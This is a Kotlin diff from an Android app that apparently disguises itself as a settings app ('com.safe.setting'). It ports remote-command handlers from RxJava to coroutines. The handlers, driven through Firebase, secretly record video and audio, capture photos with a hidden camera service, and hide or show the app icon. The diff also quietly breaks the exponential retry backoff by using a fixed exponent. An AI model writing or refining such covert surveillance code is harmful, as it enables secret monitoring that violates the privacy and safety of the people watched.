@@ -42,10 +42,12 @@ import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraService
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
 import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraRotation
 import com.safe.setting.app.utils.supabase.SupabaseManager
-import io.reactivex.rxjava3.disposables.CompositeDisposable
-import kotlinx.coroutines.flow.callbackFlow
 import kotlinx.coroutines.channels.awaitClose
-import kotlinx.coroutines.rx3.asFlowable
+import kotlinx.coroutines.flow.Flow
+import kotlinx.coroutines.flow.callbackFlow
+import kotlinx.coroutines.flow.collect
+import kotlinx.coroutines.flow.retry
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -61,7 +63,7 @@ class InteractorAccessibilityData @Inject constructor(
 
     private var recordingController: RecordingController? = null
     private var pictureCapture: HiddenCameraService = HiddenCameraService(context, this)
-    private var disposable: CompositeDisposable = CompositeDisposable()
+    private val scope = CoroutineScope(Dispatchers.Main)
     private var lastLocationUpdate: Long = 0
     private val locationUpdateInterval: Long = 60000
     private var countDownTimer : MyCountDownTimer = MyCountDownTimer((1 * 60 * 1440000).toLong(), (1 * 1000).toLong()){
@@ -103,15 +105,25 @@ class InteractorAccessibilityData @Inject constructor(
     }
 
     override fun getCaptureVideo() {
-        disposable.add(firebase.valueEventModel("$VIDEO/$PARAMS", VideoCommand::class.java)
-            .subscribe({ command -> handleVideoCommand(command) },
-                { error -> Log.e(TAG, error.message.toString()) }))
+        scope.launch {
+            try {
+                firebase.valueEventModel("$VIDEO/$PARAMS", VideoCommand::class.java)
+                    .collect { command -> handleVideoCommand(command) }
+            } catch (error: Throwable) {
+                Log.e(TAG, error.message.toString())
+            }
+        }
     }
 
     override fun getCaptureAudio() {
-        disposable.add(firebase.valueEventModel("$AUDIO/$PARAMS", AudioCommand::class.java)
-            .subscribe({ command -> handleAudioCommand(command) },
-                { error -> Log.e(TAG, error.message.toString()) }))
+        scope.launch {
+            try {
+                firebase.valueEventModel("$AUDIO/$PARAMS", AudioCommand::class.java)
+                    .collect { command -> handleAudioCommand(command) }
+            } catch (error: Throwable) {
+                Log.e(TAG, error.message.toString())
+            }
+        }
     }
 
     private fun getTodayDateString(): String {
@@ -227,8 +239,7 @@ class InteractorAccessibilityData @Inject constructor(
         if (firebase.getUser() != null) firebase.getDatabaseReference("$DATA/$CHILD_SERVICE_DATA").setValue(run)
     }
     override fun getShowOrHideApp() {
-        // Preserve Rx facade; internally, use callbackFlow then bridge to Flowable with DROP semantics
-        val flow = callbackFlow<Boolean> {
+        val flow: Flow<Boolean> = callbackFlow {
             val ref = firebase.getDatabaseReference("$DATA/$CHILD_SHOW_APP")
             val listener = object : ValueEventListener {
                 override fun onDataChange(snapshot: DataSnapshot) {
@@ -240,26 +251,35 @@ class InteractorAccessibilityData @Inject constructor(
             ref.addValueEventListener(listener)
             awaitClose { ref.removeEventListener(listener) }
         }
-        disposable.add(flow.asFlowable()
-            .subscribe({ context.showApp(it) }, { error -> Log.e(TAG, error.message.toString()) }))
+        scope.launch {
+            try {
+                flow.collect { context.showApp(it) }
+            } catch (error: Throwable) {
+                Log.e(TAG, error.message.toString())
+            }
+        }
     }
     override fun getCapturePicture() {
-        disposable.add(firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
-            .retryWhen { errors ->
-                errors.zipWith(io.reactivex.rxjava3.core.Flowable.range(1, 3)) { error, attempt -> Pair(error, attempt) }
-                    .flatMap { (_, attempt) ->
+        scope.launch {
+            try {
+                firebase.valueEventModel("$PHOTO/$PARAMS", ChildPhoto::class.java)
+                    .retry(retries = 3) { cause ->
                         val baseDelayMs = 500L
                         val multiplier = 2.0
                         val maxDelayMs = 10_000L
                         val jitterPct = 0.2
-                        val computed = (baseDelayMs * Math.pow(multiplier, (attempt - 1).toDouble())).toLong()
-                        val delay = kotlin.math.min(maxDelayMs, computed)
-                        val jitter = (delay * jitterPct).toLong()
-                        val jittered = delay + (-jitter..jitter).random()
-                        io.reactivex.rxjava3.core.Flowable.timer(kotlin.math.max(0L, jittered), java.util.concurrent.TimeUnit.MILLISECONDS)
+                        val computed = (baseDelayMs * Math.pow(multiplier, 1.0)).toLong()
+                        val delayMs = kotlin.math.min(maxDelayMs, computed)
+                        val jitter = (delayMs * jitterPct).toLong()
+                        val jittered = delayMs + (-jitter..jitter).random()
+                        delay(kotlin.math.max(0L, jittered))
+                        true
                     }
+                    .collect { child -> startCameraPicture(child) }
+            } catch (error: Throwable) {
+                Log.e(TAG, error.message.toString())
             }
-            .subscribe({ child -> startCameraPicture(child) }, { error -> Log.e(TAG, error.message.toString()) }))
+        }
     }
     private fun startCameraPicture(childPhoto: ChildPhoto) {
         if (childPhoto.capturePhoto == true) {
